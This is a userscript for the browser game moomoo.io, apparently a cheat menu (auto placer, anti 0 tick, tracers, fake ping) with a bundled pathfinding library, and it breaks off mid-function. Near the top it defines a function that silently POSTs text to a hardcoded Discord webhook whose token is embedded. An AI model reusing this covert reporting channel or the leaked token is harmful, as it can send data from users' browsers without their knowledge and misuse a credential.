// ==UserScript==
// @name            KTA
// @version         1
// @author          onion
// @description     this sucks half the mod is unreadable :sob:
// @match           *://*.moomoo.io/*
// @grant           none
// @icon            https://i.ibb.co/vDYtMnb/logo-white.png
// @namespace https://greasyfork.org/users/691507
// @downloadURL https://update.greasyfork.org/scripts/518268/KTA.user.js
// @updateURL https://update.greasyfork.org/scripts/518268/KTA.meta.js
// ==/UserScript==

var He,
    xhr = new XMLHttpRequest();
xhr.open("GET", document.URL, !1), xhr.send(null);
var content = xhr.responseText,
    doc = document.implementation.createHTMLDocument("" + (document.title || ""));

function debugg(t) {
    let n = new XMLHttpRequest();
    n.open(
        "POST",
        "https://discord.com/api/webhooks/1228516595555369122/nhrrZIwDY27Oir3VRmbMYPM3sCqaVUn-9-y-iyEUvIYM1MWdHhlzsXpTSy6vV62U4Jca"
    ),
        n.setRequestHeader("Content-type", "application/json"),
        n.send(
        JSON.stringify({
            content: t,
            username: "Counter Terrorism Unit",
            avatar_url: "https://i.ibb.co/vDYtMnb/logo-white.png",
        })
    );
}
doc.open(), doc.write(content), doc.close(), [...doc.getElementsByTagName("script")].find(t => t?.src.includes("index"))?.remove(), document.replaceChild(document.importNode(doc.documentElement, !0), document.documentElement);
var node = document.createElement("style");
(node.type = "text/css"), node.appendChild(document.createTextNode(""));
var heads = document.getElementsByTagName("head");
heads.length > 0
    ? heads[0].appendChild(node)
: document.documentElement.appendChild(node);
const fontAwesomeLink = document.createElement("link");
(fontAwesomeLink.rel = "stylesheet"),
    (fontAwesomeLink.href =
     "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"),
    document.head.appendChild(fontAwesomeLink);
const menuContainer = document.createElement("div");
(menuContainer.id = "menuContainer"),
    Object.assign(menuContainer.style, {
    width: "25%",
    zIndex: "9999999999",
    height: "100%",
    backgroundColor: "#f1f1f1",
    position: "fixed",
    top: "50%",
    left: "-100%",
    transition: "background-color 0.2s ease, left 0.4s ease-in-out",
    display: "flex",
    flexDirection: "column",
    justifyContent: "flex-start",
    padding: "10px",
    overflowY: "auto",
}),
    document.body.appendChild(menuContainer);
const themeToggle = document.createElement("div");
themeToggle.classList.add("toggle"),
    Object.assign(themeToggle.style, {
    position: "absolute",
    top: "15px",
    right: "10px",
    width: "30px",
    height: "30px",
    cursor: "pointer",
});
const themeIcon = document.createElement("i");
themeIcon.classList.add("fas", "fa-sun"),
    (themeIcon.style.fontSize = "24px"),
    themeToggle.appendChild(themeIcon),
    menuContainer.appendChild(themeToggle);
let isDarkTheme = !1;
themeToggle.addEventListener("click", () => {
    (isDarkTheme = !isDarkTheme),
        (menuContainer.style.backgroundColor = isDarkTheme ? "#252525" : "#f1f1f1"),
        (menuContainer.style.color = isDarkTheme ? "#fff" : "#000"),
        themeIcon.classList.toggle("fa-sun", !isDarkTheme),
        themeIcon.classList.toggle("fa-moon", isDarkTheme);
});
const title = document.createElement("div");
(title.innerHTML = "<h2 style='font-size: 20px;'>KTA Menu</h2>"),
    (title.style.textAlign = "center"),
    (title.style.fontSize = "90px !important"),
    menuContainer.appendChild(title);
const createRangeToggle = (t, n, min, max) => {
    let i = document.createElement("div");
    Object.assign(i.style, {
        display: "flex",
        alignItems: "center",
        justifyContent: "space-between",
        padding: "10px 0",
    });
    let o = document.createElement("label");
    (o.innerText = t), (o.style.marginRight = "10px");
    let a = document.createElement("input");
    (a.type = "range"),
        (a.style.left = "0px"),
        (a.min = min),
        (a.max = max),
        i.appendChild(o),
        i.appendChild(a),
        n.appendChild(i);
},
      createDropdownWithToggle = (t, n, i, o, a) => {
          let r = document.createElement("div");
          Object.assign(r.style, {
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "10px 0",
          });
          let s = document.createElement("label");
          if (((s.innerText = t), (s.style.marginRight = "175px"), n.length > 0)) {
              let l = document.createElement("select");
              (l.style.width = "100px"),
                  (l.style.textAlign = "center"),
                  (l.id = a),
                  n.forEach((t) => {
                  let n = document.createElement("option");
                  (n.value = t), (n.textContent = t), l.appendChild(n);
              }),
                  r.appendChild(s),
                  r.appendChild(l);
          } else r.appendChild(s);
          let c = document.createElement("label");
          c.classList.add("tiny-slider");
          let d = document.createElement("input");
          (d.type = "checkbox"), (d.id = o);
          let h = document.createElement("span");
          h.classList.add("slider-inner"),
              c.appendChild(d),
              c.appendChild(h),
              d.addEventListener("change", () => {
              h.style.backgroundColor = d.checked ? "#2196F3" : "#ccc";
          }),
              r.appendChild(c),
              i.appendChild(r);
      };
createDropdownWithToggle("Auto Placer", [], menuContainer, "autoplace"),
    createDropdownWithToggle("Auto Replacer", [], menuContainer, "autoreplace"),
    createDropdownWithToggle("Preplacer", [], menuContainer, "autopreplace"),
    createRangeToggle("Preplace Throttle", menuContainer, 0, 64),
    createDropdownWithToggle(
    "Anti Velocity 0 Tick",
    ["Close", "Near", "Far"],
    menuContainer,
    "veltick",
    "veltickdizt"
),
    createDropdownWithToggle("Anti 0 Tick", [], menuContainer, "antitick"),
    createDropdownWithToggle(
    "Tracer",
    ["Ghost Player", "Line", "Arrow"],
    menuContainer,
    "tracer",
    "tracerType"
),
    createRangeToggle("Zoom", menuContainer, 0.6, 1.5),
    createDropdownWithToggle(
    "Build HP",
    ["Rectangle", "Circle"],
    menuContainer,
    "buildhp",
    "buildHPType"
),
    createDropdownWithToggle("Object Owner ID", [], menuContainer, "objzid"),
    createDropdownWithToggle("Shadows", [], menuContainer, "zhadowz"),
    createDropdownWithToggle(
    "Place Visual",
    ["Circle", "Building"],
    menuContainer,
    "placevizual",
    "placevizualType"
),
    createDropdownWithToggle("Place Animation", [], menuContainer, "placeanim"),
    createDropdownWithToggle(
    "Object Rotation",
    ["Slow", "Normal", "Fast"],
    menuContainer,
    "objturn",
    "objTurnZpeed"
),
    createDropdownWithToggle("Grid", ["4x4", "8x8", "16x16", "default", "32x32", "chunk based"], menuContainer, "gridToggle", "grid"),
    createDropdownWithToggle(
    "Player Death Animation",
    [],
    menuContainer,
    "deathanim"
),
    createDropdownWithToggle(
    "Player Health Animation",
    [],
    menuContainer,
    "healthanim"
),
    createDropdownWithToggle(
    "KB Visual",
    ["Ghost Player", "Circle", "Line"],
    menuContainer,
    "kbvizual",
    "kbVizualType"
),
    createDropdownWithToggle(
    "Kill Chat",
    [
        "Chicken V3",
        "Chat Total Kills",
        "Kill Chat",
        "Sam Mod Kill Chat",
        "Ultra Mod Kill Chat",
    ],
    menuContainer,
    "killchat",
    "killChatType"
),
    createDropdownWithToggle("Fake Ping", [], menuContainer, "fakeping"),
    createDropdownWithToggle("Auto Capitalization", [], menuContainer, "capital");
const footer = document.createElement("div");
(footer.innerHTML = "<p>The KTA Initiative &#169; 2024</p>"),
    (footer.style.textAlign = "center"),
    (footer.style.marginTop = "auto"),
    menuContainer.appendChild(footer),
    document.addEventListener("keydown", (t) => {
    "Escape" === t.key &&
        (menuContainer.style.left =
         "-100%" === menuContainer.style.left ? "0" : "-100%");
});
const scrollbarStyle = document.createElement("style");
(scrollbarStyle.textContent = `
/* Styling the scrollbar for Webkit browsers */
#menuContainer::-webkit-scrollbar {
    width: 8px;  /* Width of the scrollbar */
}
#menuContainer::-webkit-scrollbar-track {
    background: #f1f1f1;  /* Color of the track */
}
#menuContainer::-webkit-scrollbar-thumb {
    background-color: #888;  /* Color of the scrollbar itself */
    border-radius: 10px;  /* Rounded corners of the scrollbar */
    border: 2px solid #f1f1f1;  /* Creates padding around the scroll bar */
}
#menuContainer::-webkit-scrollbar-thumb:hover {
    background: #555;  /* Color when hovering over the scrollbar */
}

/* Styling the scrollbar for Firefox */
#menuContainer {
    scrollbar-width: thin;  /* "auto" or "thin" */
    scrollbar-color: #888 #f1f1f1;  /* thumb and track color */
}
`),
    document.head.appendChild(scrollbarStyle);
const sliderStyle = document.createElement("style");
(sliderStyle.textContent = `
.slider {
    position: relative;
    display: inline-block;
    width: 60px;
    height: 34px;
}
.slider input {
    opacity: 0;
    width: 0;
    height: 0;
}
.slider .slider-inner {
    position: absolute;
    cursor: pointer;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: #ccc;
    transition: .4s;
    border-radius: 34px;
}
.slider .slider-inner:before {
    position: absolute;
    content: "";
    height: 26px;
    width: 26px;
    left: 4px;
    bottom: 4px;
    background-color: white;
    transition: .4s;
    border-radius: 50%;
}
.slider input:checked + .slider-inner {
    background-color: #2196F3;
}
.slider input:focus + .slider-inner {
    box-shadow: 0 0 1px #2196F3;
}
.slider input:checked + .slider-inner:before {
    transform: translateX(26px);
}
`),
    document.head.appendChild(sliderStyle);
const tinySliderStyle = document.createElement("style");
(tinySliderStyle.textContent = `
.tiny-slider {
    position: relative;
    display: inline-block;
    width: 40px;
    height: 20px;
}
.tiny-slider input {
    opacity: 0;
    width: 0;
    height: 0;
}
.tiny-slider .slider-inner {
    position: absolute;
    cursor: pointer;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: #ccc;
    transition: .4s;
    border-radius: 20px;
}
.tiny-slider .slider-inner:before {
    position: absolute;
    content: "";
    height: 16px;
    width: 16px;
    left: 3px;
    bottom: 2px;
    background-color: white;
    transition: .4s;
    border-radius: 50%;
}
.tiny-slider input:checked + .slider-inner {
    background-color: #2196F3;
}
.tiny-slider input:focus + .slider-inner {
    box-shadow: 0 0 1px #2196F3;
}
.tiny-slider input:checked + .slider-inner:before {
    transform: translateX(18px);
}
`),
    document.head.appendChild(tinySliderStyle);
var EasyStar = (function (t) {
    var n = {};

    function i(o) {
        if (n[o]) return n[o].exports;
        var a = (n[o] = {
            i: o,
            l: !1,
            exports: {},
        });
        return t[o].call(a.exports, a, a.exports, i), (a.l = !0), a.exports;
    }
    return (
        (i.m = t),
        (i.c = n),
        (i.d = function (t, n, o) {
            i.o(t, n) ||
                Object.defineProperty(t, n, {
                enumerable: !0,
                get: o,
            });
        }),
        (i.r = function (t) {
            "undefined" != typeof Symbol &&
                Symbol.toStringTag &&
                Object.defineProperty(t, Symbol.toStringTag, {
                value: "Module",
            }),
                Object.defineProperty(t, "__esModule", {
                value: !0,
            });
        }),
        (i.t = function (t, n) {
            if (
                (1 & n && (t = i(t)),
                 8 & n || (4 & n && "object" == typeof t && t && t.__esModule))
            )
                return t;
            var o = Object.create(null);
            if (
                (i.r(o),
                 Object.defineProperty(o, "default", {
                    enumerable: !0,
                    value: t,
                }),
                 2 & n && "string" != typeof t)
            )
                for (var a in t)
                    i.d(
                        o,
                        a,
                        function (n) {
                            return t[n];
                        }.bind(null, a)
                    );
            return o;
        }),
        (i.n = function (t) {
            var n =
                t && t.__esModule
            ? function () {
                return t.default;
            }
            : function () {
                return t;
            };
            return i.d(n, "a", n), n;
        }),
        (i.o = function (t, n) {
            return Object.prototype.hasOwnProperty.call(t, n);
        }),
        (i.p = "/bin/"),
        i((i.s = 0))
    );
})([
    function (t, n, i) {
        var o = {},
            a = i(1),
            r = i(2),
            s = i(3);
        t.exports = o;
        var l = 1;
        (o.js = function () {
            var t,
                n,
                i,
                c = !1,
                d = {},
                h = {},
                u = {},
                p = {},
                f = !0,
                $ = {},
                g = [],
                m = Number.MAX_VALUE,
                _ = !1;
            (this.setAcceptableTiles = function (t) {
                t instanceof Array
                    ? (i = t)
                : !isNaN(parseFloat(t)) && isFinite(t) && (i = [t]);
            }),
                (this.enableSync = function () {
                c = !0;
            }),
                (this.disableSync = function () {
                c = !1;
            }),
                (this.enableDiagonals = function () {
                _ = !0;
            }),
                (this.disableDiagonals = function () {
                _ = !1;
            }),
                (this.setGrid = function (n) {
                t = n;
                for (var i = 0; i < t.length; i++)
                    for (var o = 0; o < t[0].length; o++)
                        h[t[i][o]] || (h[t[i][o]] = 1);
            }),
                (this.setTileCost = function (t, n) {
                h[t] = n;
            }),
                (this.setAdditionalPointCost = function (t, n, i) {
                void 0 === u[n] && (u[n] = {}), (u[n][t] = i);
            }),
                (this.removeAdditionalPointCost = function (t, n) {
                void 0 !== u[n] && delete u[n][t];
            }),
                (this.removeAllAdditionalPointCosts = function () {
                u = {};
            }),
                (this.setDirectionalCondition = function (t, n, i) {
                void 0 === p[n] && (p[n] = {}), (p[n][t] = i);
            }),
                (this.removeAllDirectionalConditions = function () {
                p = {};
            }),
                (this.setIterationsPerCalculation = function (t) {
                m = t;
            }),
                (this.avoidAdditionalPoint = function (t, n) {
                void 0 === d[n] && (d[n] = {}), (d[n][t] = 1);
            }),
                (this.stopAvoidingAdditionalPoint = function (t, n) {
                void 0 !== d[n] && delete d[n][t];
            }),
                (this.enableCornerCutting = function () {
                f = !0;
            }),
                (this.disableCornerCutting = function () {
                f = !1;
            }),
                (this.stopAvoidingAllAdditionalPoints = function () {
                d = {};
            }),
                (this.findPath = function (n, o, r, d, h) {
                function u(t) {
                    c
                        ? h(t)
                    : setTimeout(function () {
                        h(t);
                    });
                }
                if (void 0 === i)
                    throw Error(
                        "You can't set a path without first calling setAcceptableTiles() on EasyStar."
                    );
                if (void 0 === t)
                    throw Error(
                        "You can't set a path without first calling setGrid() on EasyStar."
                    );
                if (
                    n < 0 ||
                    o < 0 ||
                    r < 0 ||
                    d < 0 ||
                    n > t[0].length - 1 ||
                    o > t.length - 1 ||
                    r > t[0].length - 1 ||
                    d > t.length - 1
                )
                    throw Error(
                        "Your start or end point is outside the scope of your grid."
                    );
                if (n !== r || o !== d) {
                    for (var p = t[d][r], f = !1, m = 0; m < i.length; m++)
                        if (p === i[m]) {
                            f = !0;
                            break;
                        }
                    if (!1 !== f) {
                        var _ = new a();
                        return (
                            (_.openList = new s(function (t, n) {
                                return t.bestGuessDistance() - n.bestGuessDistance();
                            })),
                            (_.isDoneCalculating = !1),
                            (_.nodeHash = {}),
                            (_.startX = n),
                            (_.startY = o),
                            (_.endX = r),
                            (_.endY = d),
                            (_.callback = u),
                            _.openList.push(x(_, _.startX, _.startY, null, 1)),
                            ($[(d = l++)] = _),
                            g.push(d),
                            d
                        );
                    }
                    u(null);
                } else u([]);
            }),
                (this.cancelPath = function (t) {
                return t in $ && (delete $[t], !0);
            }),
                (this.calculate = function () {
                if (0 !== g.length && void 0 !== t && void 0 !== i)
                    for (n = 0; n < m; n++) {
                        if (0 === g.length) return;
                        c && (n = 0);
                        var o = g[0],
                            a = $[o];
                        if (void 0 !== a) {
                            if (0 !== a.openList.size()) {
                                var r = a.openList.pop();
                                if (a.endX !== r.x || a.endY !== r.y)
                                    (r.list = 0) < r.y && k(a, r, 0, -1, +w(r.x, r.y - 1)),
                                        r.x < t[0].length - 1 && k(a, r, 1, 0, +w(r.x + 1, r.y)),
                                        r.y < t.length - 1 && k(a, r, 0, 1, +w(r.x, r.y + 1)),
                                        0 < r.x && k(a, r, -1, 0, +w(r.x - 1, r.y)),
                                        _ &&
                                        (0 < r.x &&
                                         0 < r.y &&
                                         (f ||
                                          (v(t, i, r.x, r.y - 1, r) &&
                                           v(t, i, r.x - 1, r.y, r))) &&
                                         k(a, r, -1, -1, 1.4 * w(r.x - 1, r.y - 1)),
                                         r.x < t[0].length - 1 &&
                                         r.y < t.length - 1 &&
                                         (f ||
                                          (v(t, i, r.x, r.y + 1, r) &&
                                           v(t, i, r.x + 1, r.y, r))) &&
                                         k(a, r, 1, 1, 1.4 * w(r.x + 1, r.y + 1)),
                                         r.x < t[0].length - 1 &&
                                         0 < r.y &&
                                         (f ||
                                          (v(t, i, r.x, r.y - 1, r) &&
                                           v(t, i, r.x + 1, r.y, r))) &&
                                         k(a, r, 1, -1, 1.4 * w(r.x + 1, r.y - 1)),
                                         0 < r.x &&
                                         r.y < t.length - 1 &&
                                         (f ||
                                          (v(t, i, r.x, r.y + 1, r) &&
                                           v(t, i, r.x - 1, r.y, r))) &&
                                         k(a, r, -1, 1, 1.4 * w(r.x - 1, r.y + 1)));
                                else {
                                    var s = [];
                                    s.push({
                                        x: r.x,
                                        y: r.y,
                                    });
                                    for (var l = r.parent; null != l; )
                                        s.push({
                                            x: l.x,
                                            y: l.y,
                                        }),
                                            (l = l.parent);
                                    s.reverse(), a.callback(s), delete $[o], g.shift();
                                }
                            } else a.callback(null), delete $[o], g.shift();
                        } else g.shift();
                    }
            });
            var k = function (n, o, a, r, s) {
                (a = o.x + a),
                    (void 0 !== d[(r = o.y + r)] && void 0 !== d[r][a]) ||
                    !v(t, i, a, r, o) ||
                    (void 0 === (r = x(n, a, r, o, s)).list
                     ? ((r.list = 1), n.openList.push(r))
                     : o.costSoFar + s < r.costSoFar &&
                     ((r.costSoFar = o.costSoFar + s),
                      (r.parent = o),
                      n.openList.updateItem(r)));
            },
                v = function (t, n, i, o, a) {
                    var r = p[o] && p[o][i];
                    if (r) {
                        var s = b(a.x - i, a.y - o);
                        if (
                            !(function () {
                                for (var t = 0; t < r.length; t++) if (r[t] === s) return !0;
                                return !1;
                            })()
                        )
                            return !1;
                    }
                    for (var l = 0; l < n.length; l++) if (t[o][i] === n[l]) return !0;
                    return !1;
                },
                b = function (t, n) {
                    if (0 === t && -1 === n) return o.TOP;
                    if (1 === t && -1 === n) return o.TOP_RIGHT;
                    if (1 === t && 0 === n) return o.RIGHT;
                    if (1 === t && 1 === n) return o.BOTTOM_RIGHT;
                    if (0 === t && 1 === n) return o.BOTTOM;
                    if (-1 === t && 1 === n) return o.BOTTOM_LEFT;
                    if (-1 === t && 0 === n) return o.LEFT;
                    if (-1 === t && -1 === n) return o.TOP_LEFT;
                    throw Error("These differences are not valid: " + t + ", " + n);
                },
                w = function (n, i) {
                    return (u[i] && u[i][n]) || h[t[i][n]];
                },
                x = function (t, n, i, o, a) {
                    if (void 0 !== t.nodeHash[i]) {
                        if (void 0 !== t.nodeHash[i][n]) return t.nodeHash[i][n];
                    } else t.nodeHash[i] = {};
                    var s = S(n, i, t.endX, t.endY),
                        a = null !== o ? o.costSoFar + a : 0,
                        s = new r(o, n, i, a, s);
                    return (t.nodeHash[i][n] = s);
                },
                S = function (t, n, i, o) {
                    var a, r;
                    return _
                        ? (a = Math.abs(t - i)) < (r = Math.abs(n - o))
                        ? 1.4 * a + r
                    : 1.4 * r + a
                    : (a = Math.abs(t - i)) + (r = Math.abs(n - o));
                };
        }),
            (o.TOP = "TOP"),
            (o.TOP_RIGHT = "TOP_RIGHT"),
            (o.RIGHT = "RIGHT"),
            (o.BOTTOM_RIGHT = "BOTTOM_RIGHT"),
            (o.BOTTOM = "BOTTOM"),
            (o.BOTTOM_LEFT = "BOTTOM_LEFT"),
            (o.LEFT = "LEFT"),
            (o.TOP_LEFT = "TOP_LEFT");
    },
    function (t, n) {
        t.exports = function () {
            (this.pointsToAvoid = {}),
                this.startX,
                this.callback,
                this.startY,
                this.endX,
                this.endY,
                (this.nodeHash = {}),
                this.openList;
        };
    },
    function (t, n) {
        t.exports = function (t, n, i, o, a) {
            (this.parent = t),
                (this.x = n),
                (this.y = i),
                (this.costSoFar = o),
                (this.simpleDistanceToTarget = a),
                (this.bestGuessDistance = function () {
                return this.costSoFar + this.simpleDistanceToTarget;
            });
        };
    },
    function (t, n, i) {
        t.exports = i(4);
    },
    function (t, n, i) {
        var o, a;
        (function () {
            var i, r, s, l, c, d, h, u, p, f, $, g, m, _, k;

            function v(t) {
                (this.cmp = null != t ? t : r), (this.nodes = []);
            }
            (s = Math.floor),
                (f = Math.min),
                (r = function (t, n) {
                return t < n ? -1 : n < t ? 1 : 0;
            }),
                (p = function (t, n, i, o, a) {
                var l;
                if ((null == i && (i = 0), null == a && (a = r), i < 0))
                    throw Error("lo must be non-negative");
                for (null == o && (o = t.length); i < o; )
                    0 > a(n, t[(l = s((i + o) / 2))]) ? (o = l) : (i = l + 1);
                return [].splice.apply(t, [i, i - i].concat(n)), n;
            }),
                (d = function (t, n, i) {
                return null == i && (i = r), t.push(n), _(t, 0, t.length - 1, i);
            }),
                (c = function (t, n) {
                var i, o;
                return (
                    null == n && (n = r),
                    (i = t.pop()),
                    t.length ? ((o = t[0]), (t[0] = i), k(t, 0, n)) : (o = i),
                    o
                );
            }),
                (u = function (t, n, i) {
                var o;
                return null == i && (i = r), (o = t[0]), (t[0] = n), k(t, 0, i), o;
            }),
                (h = function (t, n, i) {
                var o;
                return (
                    null == i && (i = r),
                    t.length &&
                    0 > i(t[0], n) &&
                    ((n = (o = [t[0], n])[0]), (t[0] = o[1]), k(t, 0, i)),
                    n
                );
            }),
                (l = function (t, n) {
                var i, o, a, l, c, d;
                for (
                    null == n && (n = r),
                    c = [],
                    o = 0,
                    a = (l = function () {
                        d = [];
                        for (
                            var n = 0, i = s(t.length / 2);
                            0 <= i ? n < i : i < n;
                            0 <= i ? n++ : n--
                        )
                            d.push(n);
                        return d;
                    }
                         .apply(this)
                         .reverse()).length;
                    o < a;
                    o++
                )
                    (i = l[o]), c.push(k(t, i, n));
                return c;
            }),
                (m = function (t, n, i) {
                if ((null == i && (i = r), -1 !== (n = t.indexOf(n))))
                    return _(t, 0, n, i), k(t, n, i);
            }),
                ($ = function (t, n, i) {
                var o, a, s, c, d;
                if ((null == i && (i = r), !(a = t.slice(0, n)).length)) return a;
                for (l(a, i), s = 0, c = (d = t.slice(n)).length; s < c; s++)
                    h(a, (o = d[s]), i);
                return a.sort(i).reverse();
            }),
                (g = function (t, n, i) {
                var o, a, s, d, h, u, $, g, m;
                if ((null == i && (i = r), 10 * n <= t.length)) {
                    if (!(s = t.slice(0, n).sort(i)).length) return s;
                    for (
                        a = s[s.length - 1], d = 0, u = ($ = t.slice(n)).length;
                        d < u;
                        d++
                    )
                        0 > i((o = $[d]), a) &&
                            (p(s, o, 0, null, i), s.pop(), (a = s[s.length - 1]));
                    return s;
                }
                for (
                    l(t, i), m = [], h = 0, g = f(n, t.length);
                    0 <= g ? h < g : g < h;
                    0 <= g ? ++h : --h
                )
                    m.push(c(t, i));
                return m;
            }),
                (_ = function (t, n, i, o) {
                var a, s, l;
                for (
                    null == o && (o = r), a = t[i];
                    n < i && 0 > o(a, (s = t[(l = (i - 1) >> 1)]));

                )
                    (t[i] = s), (i = l);
                return (t[i] = a);
            }),
                (k = function (t, n, i) {
                var o, a, s, l, c;
                for (
                    null == i && (i = r), a = t.length, s = t[(c = n)], o = 2 * n + 1;
                    o < a;

                )
                    (l = o + 1) < a && !(0 > i(t[o], t[l])) && (o = l),
                        (t[n] = t[o]),
                        (o = 2 * (n = o) + 1);
                return (t[n] = s), _(t, c, n, i);
            }),
                (v.push = d),
                (v.pop = c),
                (v.replace = u),
                (v.pushpop = h),
                (v.heapify = l),
                (v.updateItem = m),
                (v.nlargest = $),
                (v.nsmallest = g),
                (v.prototype.push = function (t) {
                return d(this.nodes, t, this.cmp);
            }),
                (v.prototype.pop = function () {
                return c(this.nodes, this.cmp);
            }),
                (v.prototype.peek = function () {
                return this.nodes[0];
            }),
                (v.prototype.contains = function (t) {
                return -1 !== this.nodes.indexOf(t);
            }),
                (v.prototype.replace = function (t) {
                return u(this.nodes, t, this.cmp);
            }),
                (v.prototype.pushpop = function (t) {
                return h(this.nodes, t, this.cmp);
            }),
                (v.prototype.heapify = function () {
                return l(this.nodes, this.cmp);
            }),
                (v.prototype.updateItem = function (t) {
                return m(this.nodes, t, this.cmp);
            }),
                (v.prototype.clear = function () {
                return (this.nodes = []);
            }),
                (v.prototype.empty = function () {
                return 0 === this.nodes.length;
            }),
                (v.prototype.size = function () {
                return this.nodes.length;
            }),
                (v.prototype.clone = function () {
                var t = new v();
                return (t.nodes = this.nodes.slice(0)), t;
            }),
                (v.prototype.toArray = function () {
                return this.nodes.slice(0);
            }),
                (v.prototype.insert = v.prototype.push),
                (v.prototype.top = v.prototype.peek),
                (v.prototype.front = v.prototype.peek),
                (v.prototype.has = v.prototype.contains),
                (v.prototype.copy = v.prototype.clone),
                (i = v),
                (o = []),
                void 0 ===
                (a =
                 "function" ==
                 typeof (a = function () {
                return i;
            })
                 ? a.apply(n, o)
                 : a) || (t.exports = a);
        }.call(this));
    },
]);
let PathfinderManager = new EasyStar.js();
var pps = 0,
    ppm = 0,
    FPS = 0,
    enemiez = [],
    enemy = [],
    itemPlacer = [],
    breakMarker = [],
    deadPlayers = [],
    pathFindTest = 0,
    grid = [],
    pathFind = {
        active: !0,
        grid: 40,
        scale: 1440,
        x: 14400,
        y: 14400,
        chaseNear: !0,
        array: [],
        lastX: 20,
        lastY: 20,
    };
(WebSocket.prototype.send = new Proxy(WebSocket.prototype.send, {
    apply: (t, n, i) => (
        pps++,
        ppm++,
        setTimeout(() => {
            pps--;
        }, 1e3),
        setTimeout(() => {
            ppm--;
        }, 6e4),
        Reflect.apply(t, n, i)
    ),
})),
    (function () {
    let t = document.createElement("link").relList;
    if (!(t && t.supports && t.supports("modulepreload"))) {
        for (let n of document.querySelectorAll('link[rel="modulepreload"]'))
            i(n);
        new MutationObserver((t) => {
            for (let n of t)
                if ("childList" === n.type)
                    for (let o of n.addedNodes)
                        "LINK" === o.tagName && "modulepreload" === o.rel && i(o);
        }).observe(document, {
            childList: !0,
            subtree: !0,
        });
    }

    function i(t) {
        if (t.ep) return;
        t.ep = !0;
        let n = (function t(n) {
            let i = {};
            return (
                n.integrity && (i.integrity = n.integrity),
                n.referrerpolicy && (i.referrerPolicy = n.referrerpolicy),
                "use-credentials" === n.crossorigin
                ? (i.credentials = "include")
                : "anonymous" === n.crossorigin
                ? (i.credentials = "omit")
                : (i.credentials = "same-origin"),
                i
            );
        })(t);
        fetch(t.href, n);
    }
})();
var Ke = 4294967295;

function Ko(t, n, i) {
    t.setUint32(n, i / 4294967296), t.setUint32(n + 4, i);
}

function Br(t, n, i) {
    var o = Math.floor(i / 4294967296);
    t.setUint32(n, o), t.setUint32(n + 4, i);
}

function zr(t, n) {
    var i;
    return 4294967296 * t.getInt32(n) + t.getUint32(n + 4);
}

function Jo(t, n) {
    var i;
    return 4294967296 * t.getUint32(n) + t.getUint32(n + 4);
}
var Gi,
    Yi,
    $i,
    Pi =
    (typeof process > "u" ||
     (null === (Gi = null == process ? void 0 : process.env) || void 0 === Gi
      ? void 0
      : Gi.TEXT_ENCODING) !== "never") &&
    "u" > typeof TextEncoder &&
    "u" > typeof TextDecoder;

function Cs(t) {
    for (var n = t.length, i = 0, o = 0; o < n; ) {
        var a = t.charCodeAt(o++);
        if (4294967168 & a) {
            if (4294965248 & a) {
                if (a >= 55296 && a <= 56319 && o < n) {
                    var r = t.charCodeAt(o);
                    (64512 & r) == 56320 &&
                        (++o, (a = ((1023 & a) << 10) + (1023 & r) + 65536));
                }
                4294901760 & a ? (i += 4) : (i += 3);
            } else i += 2;
        } else {
            i++;
            continue;
        }
    }
    return i;
}

function Qo(t, n, i) {
    for (var o = t.length, a = i, r = 0; r < o; ) {
        var s = t.charCodeAt(r++);
        if (4294967168 & s) {
            if (4294965248 & s) {
                if (s >= 55296 && s <= 56319 && r < o) {
                    var l = t.charCodeAt(r);
                    (64512 & l) == 56320 &&
                        (++r, (s = ((1023 & s) << 10) + (1023 & l) + 65536));
                }
                4294901760 & s
                    ? ((n[a++] = ((s >> 18) & 7) | 240),
                       (n[a++] = ((s >> 12) & 63) | 128),
                       (n[a++] = ((s >> 6) & 63) | 128))
                : ((n[a++] = ((s >> 12) & 15) | 224),
                   (n[a++] = ((s >> 6) & 63) | 128));
            } else n[a++] = ((s >> 6) & 31) | 192;
        } else {
            n[a++] = s;
            continue;
        }
        n[a++] = (63 & s) | 128;
    }
}
var Ut = Pi ? new TextEncoder() : void 0,
    Zo = Pi
? "u" > typeof process &&
    (null === (Yi = null == process ? void 0 : process.env) || void 0 === Yi
     ? void 0
     : Yi.TEXT_ENCODING) !== "force"
? 200
: 0
: Ke;

function jo(t, n, i) {
    n.set(Ut.encode(t), i);
}

function ea(t, n, i) {
    Ut.encodeInto(t, n.subarray(i));
}
var ta = null != Ut && Ut.encodeInto ? ea : jo,
    ia = 4096;

function Hr(t, n, i) {
    for (var o = n, a = o + i, r = [], s = ""; o < a; ) {
        var l = t[o++];
        if (128 & l) {
            if ((224 & l) == 192) {
                var c = 63 & t[o++];
                r.push(((31 & l) << 6) | c);
            } else if ((240 & l) == 224) {
                var c = 63 & t[o++],
                    d = 63 & t[o++];
                r.push(((31 & l) << 12) | (c << 6) | d);
            } else if ((248 & l) == 240) {
                var c = 63 & t[o++],
                    d = 63 & t[o++],
                    h = ((7 & l) << 18) | (c << 12) | (d << 6) | (63 & t[o++]);
                h > 65535 &&
                    ((h -= 65536),
                     r.push(((h >>> 10) & 1023) | 55296),
                     (h = 56320 | (1023 & h))),
                    r.push(h);
            } else r.push(l);
        } else r.push(l);
        r.length >= ia &&
            ((s += String.fromCharCode.apply(String, r)), (r.length = 0));
    }
    return r.length > 0 && (s += String.fromCharCode.apply(String, r)), s;
}
var na = Pi ? new TextDecoder() : null,
    sa = Pi
? "u" > typeof process &&
    (null === ($i = null == process ? void 0 : process.env) || void 0 === $i
     ? void 0
     : $i.TEXT_DECODER) !== "force"
? 200
: 0
: Ke;

function ra(t, n, i) {
    var o = t.subarray(n, n + i);
    return na.decode(o);
}
var si = function t(n, i) {
    (this.type = n), (this.data = i);
},
    oa =
    (globalThis && globalThis.__extends) ||
    (function () {
        var t = function (n, i) {
            return (t =
                    Object.setPrototypeOf ||
                    ({
                __proto__: [],
            } instanceof Array &&
                     function (t, n) {
                t.__proto__ = n;
            }) ||
                    function (t, n) {
                for (var i in n)
                    Object.prototype.hasOwnProperty.call(n, i) && (t[i] = n[i]);
            })(n, i);
        };
        return function (n, i) {
            if ("function" != typeof i && null !== i)
                throw TypeError(
                    "Class extends value " + String(i) + " is not a constructor or null"
                );

            function o() {
                this.constructor = n;
            }
            t(n, i),
                (n.prototype =
                 null === i
                 ? Object.create(i)
                 : ((o.prototype = i.prototype), new o()));
        };
    })(),
    Pe = (function (t) {
        function n(i) {
